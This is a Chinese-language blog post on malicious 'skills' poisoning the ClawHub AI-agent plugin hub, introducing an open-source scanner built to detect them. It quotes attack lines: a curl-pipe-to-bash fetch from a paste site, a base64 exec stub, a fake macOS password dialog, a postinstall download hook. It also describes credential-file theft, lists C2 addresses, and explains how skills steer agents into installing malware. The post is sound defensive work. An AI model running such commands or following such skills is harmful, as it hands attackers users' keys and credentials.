# OpenClaw遭遇大规模投毒，我开源了安全工具

> 当 AI Agent 的供应链被攻破，你安装的每一个「技能」都可能是特洛伊木马。

## 发生了什么

ClawHub 是 OpenClaw 的官方插件中心——简单说就是 AI Agent 生态里的「npm / pip」，大家在这里上传和下载 Agent 技能。你想让你的 Claude 或 OpenClaw Agent 会搜索、会画图、会发推特？去 ClawHub 装个 Skill 就行。

问题是，这个「就行」的背后，几乎没有安全审查。

据慢雾安全团队（@SlowMist_Team）监测，ClawHub 已被大量恶意 Skills 渗透。目前已有 **472+ 个恶意 Skills** 被识别，通常伪装成加密资产工具、安全检查工具或自动化助手。影响 Linux / Windows / macOS 全平台。

下面这张截图就是 ClawHub 的真实情况——搜索 "twitter" 相关 Skill，下载量 257 的热门 Skill 已被标记为 SCAM：

![ClawHub 平台上被标记为 SCAM 的热门 Skill](images/clawhub-scam.jpeg)

**这不是假设性的威胁，这正在发生。**

## 事件时间线

2026 年 2 月 5 日，安全研究员 Daniel Lockyer 在 X 上首先披露："malware found in the top downloaded skill on clawhub"——ClawHub 上下载量最高的 Skill 里发现了恶意软件。

随后，慢雾创始人余弦（@evilcos）亲自验证并转发：在 ClawHub 里一些热门下载的 Skills 存在后门，会引导 OpenClaw 下载安装恶意软件。他提醒：**「玩 AI 这些工具要用独立环境……文本不再是文本，而是指令。」**

![余弦推文验证 ClawHub 恶意 Skills](images/cos-tweet.png)

2 月 9 日，慢雾安全团队正式发布完整的威胁情报分析报告《[威胁情报｜ClawHub 恶意 skills 投毒分析](https://mp.weixin.qq.com/s/mH2kApjTgBw6iskh-HBFNQ)》（作者：Yao & sissice），全面披露了攻击手法、恶意样本和幕后组织。

![慢雾安全团队威胁情报报告](images/slowmist-report.png)

## 跟我有什么关系

我是一个重度使用 Claude Code 和 OpenClaw 的开发者，平时用 Claude Code 写代码、用 OpenClaw 跑自动化，下面就是我的真实工作环境：

![用 Claude Code 调试 OpenClaw Gateway](images/claude-code-debug.png)

![OpenClaw Doctor 检查系统状态](images/openclaw-doctor.png)

看到报告的那一刻，我立刻想到——本地 `~/.claude/skills/` 目录下躺着近 40 个 Skill，`~/.openclaw/workspace/skills/` 下面还有一堆。哪些是干净的？哪些可能正在偷偷读我的 SSH 密钥？不知道。

这种不确定感让人非常不舒服。

## 攻击者到底在干什么

472 个恶意 Skill 不是简单的挂马。我仔细研读了慢雾的完整报告，攻击手法相当专业：

### 手法一：两段式载荷投递

Skill 代码本身看起来人畜无害，但运行时会从 rentry.co 或 glot.io 这类 paste 服务下载「第二段」恶意载荷，然后直接 pipe 给 bash 执行：

```bash
curl -s https://rentry.co/raw/xxxxx | bash
```

巧妙之处在于，攻击者可以随时更新 paste 内容而不改动 Skill 代码。代码审查时看不出问题，但运行时就变了脸。

### 手法二：Base64 编码后门

将恶意代码 Base64 编码后塞进一个看起来像配置文件的地方，运行时解码执行：

```python
exec(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwg..."))
```

肉眼扫一遍代码，你只会看到一串看似无害的字母数字。

### 手法三：伪造 macOS 系统密码弹窗

这招最绝——用 `osascript` 弹出一个和 macOS 系统偏好设置一模一样的密码输入框：

```bash
osascript -e 'display dialog "System Preferences needs your password..." with hidden answer'
```

用户以为是系统在问密码，实际上密码直接被发到了攻击者的服务器。

### 手法四：npm postinstall 钩子

`package.json` 里一行 `"postinstall": "curl ... | bash"`，用户 `npm install` 的瞬间就中招了。这是前端供应链攻击的经典手法，现在原封不动地搬到了 AI Agent 生态。

### 手法五：文件窃取 + 打包上传

遍历 `~/.ssh/`、`~/.aws/credentials`、`.env` 文件，打成 ZIP 包通过 HTTPS POST 发到 C2 服务器。你的 SSH 私钥、AWS 密钥、各种 API Token，一锅端。

报告还点名了一个叫 **Poseidon** 的攻击组织，至少 120 个恶意 Skill 与其相关，使用 91.92.242.30 和 95.92.242.30 两个主 C2 服务器。

## 意识到一个问题：没有现成工具

看完报告，我第一反应是：有没有现成的扫描工具？

答案是没有。

npm 生态有 `npm audit`，Python 有 `pip-audit`，Docker 有 `trivy`。但 AI Agent Skill 这个领域，安全工具几乎是一片空白。每个 Skill 就是一个目录，里面可能有 Python 脚本、Shell 脚本、Node.js 代码、Markdown 文档——形态不统一，没有标准的包管理器，自然也没有标准的安全审计工具。

手动检查 40 个 Skill 的每一个文件？不现实。

所以我决定自己造一个。

## 设计思路：把安全分析师的经验编码成检测器

我的目标很明确：**造一个能自动扫描所有已安装 Skill 的安全审计工具，用 Claude Code 的 Skill 形式封装，让 AI Agent 能随时给自己做安全体检。**

几个关键设计决策：

### 决策 1：纯 Python stdlib，零依赖

Skill 的安装环境不可预期。用户可能没装 pip，可能在受限环境里。所以整个扫描引擎只用 Python 标准库——`re`、`json`、`hashlib`、`base64`、`math`，连 `subprocess` 都没用。

下载即用，不需要 `pip install` 任何东西。

### 决策 2：外部 IOC 数据库

IOC（Indicators of Compromise，入侵指标）是安全行业的标准做法——把已知恶意 IP、域名、文件哈希等提取出来，做成可查询的数据库。

我把 IOC 数据放在独立的 JSON 文件里，而不是硬编码在扫描器代码中。好处是：发现新的恶意指标时，编辑 JSON 就行，不需要改扫描器逻辑。

### 决策 3：13 个检测器 + 置信度评分

参照慢雾报告中的攻击手法，我设计了 13 个检测器，覆盖从代码混淆、远程下载执行、凭据窃取到持久化安装等各个环节：

| 检测器 | 抓什么 | 严重级别 |
|--------|--------|---------|
| **DownloadExecDetector** | `curl\|bash`、`wget\|sh` 等远程下载执行 | CRITICAL |
| **IOCMatchDetector** | 已知恶意 IP/域名/URL/文件哈希 | CRITICAL |
| **CredentialTheftDetector** | osascript 密码弹窗、Keychain 访问、SSH 密钥读取 | CRITICAL |
| **Base64Detector** | >50 字符的 Base64 编码串 | MEDIUM→HIGH |
| **ObfuscationDetector** | eval/exec + 非字面量参数、hex 编码、chr() 链 | HIGH |
| **ExfiltrationDetector** | ZIP 打包 + 上传、敏感目录遍历 | HIGH |
| **PersistenceDetector** | crontab、launchd plist、systemd service | HIGH |
| **PostInstallHookDetector** | npm postinstall、pip setup.py cmdclass | HIGH→CRITICAL |
| **PrivilegeEscalationDetector** | sudo、chmod 777、setuid | HIGH |
| **EntropyDetector** | 高熵值长行（Shannon 熵 >5.5） | MEDIUM |
| **NetworkCallDetector** | socket/http/fetch/curl/wget 网络调用 | MEDIUM |
| **HiddenCharDetector** | 零宽字符、Unicode Bidi 方向控制符 | MEDIUM |
| **SocialEngineeringDetector** | crypto/wallet/airdrop 等诱导命名 | LOW→MEDIUM |

每个发现（Finding）除了严重级别，还带一个 **0-100 的置信度评分**。比如，一个 Base64 字符串解码后包含 `exec` 关键词，置信度 85%；只是普通的编码数据，置信度只有 40%。这样用户可以优先关注高置信度的发现，减少误报疲劳。

### 决策 4：自动发现 + 智能排除

扫描器会自动扫描三个位置：
- `~/.claude/skills/` — Claude Code 技能目录
- `~/.openclaw/workspace/skills/` — OpenClaw 工作区
- `~/.openclaw/openclaw.json` 中配置的额外技能目录

同时自动排除 `venv/`、`node_modules/`、`.git/` 等目录。这些目录里的依赖代码应该用专业工具（npm audit / pip-audit）来审计，而不是我们的 Skill 扫描器。不排除的话，一个 `node_modules` 就能产生上万个误报。

## 实战：扫描我自己的 39 个 Skill

工具造好后，第一件事就是扫自己。

```bash
python3 skill_audit.py
```

```
======================================================================
  SKILL SECURITY AUDIT REPORT
  Scanned: 39 skills, 338 files
======================================================================

  Summary: CRITICAL: 42  |  HIGH: 41  |  MEDIUM: 125  |  LOW: 3
```

第一次看到这个数字的时候，说实话有点慌。42 个 CRITICAL？

但仔细看发现，大量 CRITICAL 来自一个 PPT 生成技能里嵌入的大段代码——里面有合法的 Base64 图片数据和网络调用。而 HIGH 里很多是扫描器自身的检测模式被自己检测到了（一个安全工具扫自己，必然会命中自己定义的恶意模式）。

这反而暴露了一个好问题：**误报调优是安全工具的核心挑战。**

## 四轮误报优化

### 第一轮：JavaScript RegExp `.exec()` 不是恶意的 `exec()`

TypeScript/JavaScript 中 `regex.exec(src)` 是正则表达式的标准方法，和 Python 的 `exec()` 代码执行完全是两回事。修复：用负向后行断言 `(?<!\.)exec` 排除对象方法调用。

### 第二轮：package-lock.json 的 integrity hash

npm 锁文件里的 `"integrity": "sha512-xxxxx=="` 是正常的包完整性校验哈希。修复：Base64Detector 直接跳过 lock 文件和包含 `"integrity"` 或 `"sha256"` 关键词的行。

### 第三轮：中文天然高熵值

中文字符的 Unicode 码点分布范围远大于 ASCII，天然具有更高的 Shannon 熵。一行中文描述的熵值可以轻松超过 5.5，但这显然不是加密载荷。修复：检测到 CJK 字符时，将熵阈值从 5.5 提高到 6.5；Markdown/TXT 文件同理。

### 第四轮：文档中引用 sudo 不是提权攻击

一个 UI 框架 Skill 的 SKILL.md 里写了 `sudo apt update && sudo apt install python3`，这是给用户看的安装说明，不是真的在提权。修复：PrivilegeEscalationDetector 跳过 `.md`、`.txt` 等文档文件。

四轮优化后：
- HIGH: 65 → 41（下降 37%）
- MEDIUM: 247 → 125（下降 49%）
- 合法 Skill（如 tavily-search）降至 0 CRITICAL

**关键验证：** tavily-search 这种合法的网络调用 Skill，扫描结果只有 2 个 MEDIUM 级别的 NetworkCallDetector 发现（fetch 调用到 Tavily API），置信度 35%。没有 CRITICAL 或 HIGH 级别的误报。这正是我们想要的效果——真正的网络调用被标记为「信息性」而不是「恶意」。

## 完整的技能包结构

最终我把整个方案打包成了一个 Claude Code Skill：

```
skill-security-audit/
├── SKILL.md                          # 技能定义和使用指南
├── scripts/
│   ├── skill_audit.py                # 扫描引擎（905 行，纯 stdlib）
│   └── ioc_database.json             # 已知恶意指标数据库
└── references/
    ├── ioc-database.md               # 人类可读 IOC 清单
    ├── threat-patterns.md            # 9 种攻击模式详解
    └── remediation-guide.md          # 发现恶意 Skill 后的应急手册
```

用法极简：

```bash
# 扫描所有已安装 Skill
python3 skill_audit.py

# 扫描单个 Skill
python3 skill_audit.py --path /path/to/suspicious-skill

# JSON 输出（方便集成到 CI）
python3 skill_audit.py --json

# 只看高危和严重
python3 skill_audit.py --severity high
```

退出码遵循 Unix 惯例：0 = 干净，1 = 低中风险，2 = 高风险，3 = 严重，4 = 扫描器错误。可以直接集成到 CI/CD。

在 Claude Code 里，只需要说「安全审计」或「scan skills」，就会触发这个技能。

## 给 AI Agent 社区的几点建议

### 1. 不要盲目信任社区技能

ClawHub 也好，其他 Skill 市场也好，目前都缺乏有效的安全审查机制。安装前至少翻一遍代码，特别是 `.sh`、`.py`、`.js` 文件和 `package.json` 里的 scripts 字段。

### 2. 关注你的 postinstall

如果一个 Skill 要你 `npm install`，先看 `package.json` 有没有 `postinstall` 钩子。这是供应链攻击最爱用的入口。

### 3. 敏感文件要隔离

不要在同一台机器上同时放 SSH 私钥、AWS 凭据和实验性的 AI Agent Skill。如果必须这样做，至少用 Docker 或虚拟机做隔离。

### 4. 定期扫描

就像定期做体检一样，每次安装新 Skill 后跑一遍扫描器。我已经把它加到了自己的工作流里。

### 5. 发现恶意 Skill 要上报

上报到 ClawHub 平台、慢雾安全团队、以及 Skill 所在的 GitHub 仓库。你的上报可能保护其他开发者免受同样的攻击。

## 写在最后

AI Agent 生态正在高速膨胀。Claude Code 的 Skill 系统、OpenClaw 的插件体系、MCP Server……每一个扩展点都是潜在的攻击面。

472 个恶意 Skill 不是终点，而是开始。随着 AI Agent 越来越多地被用于自动化操作——访问文件系统、调用 API、执行代码——一个被投毒的 Skill 的破坏力远超传统恶意软件。

我做这个安全审计技能，不是为了一劳永逸地解决问题，而是希望能让更多人意识到：**你给 AI Agent 装的每一个技能，本质上都是在给它赋予一份信任。这份信任值得被审视。**

工具已开源，欢迎使用和改进。

---

*工具地址：https://github.com/smartchainark/skill-security-audit*
*感谢慢雾安全团队的威胁情报分析，为本工具提供了关键的 IOC 数据和攻击模式参考。*
